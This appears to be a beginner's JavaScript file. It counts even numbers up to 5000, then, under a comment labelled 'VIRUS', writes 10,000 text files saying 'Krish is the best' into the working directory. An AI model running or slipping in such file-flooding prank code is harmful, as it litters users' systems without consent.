var count = 0;
for (let i = 2; i <= 5000; i++) {
    if (i % 2 == 0) {
        count++
    }
}
console.log(count)
// VIRUS

var fs = require("fs")




for (let i = 1; i <= 10000; i++) {
    fs.writeFile(i + ".txt", "Krish is the best", (error) => { });
}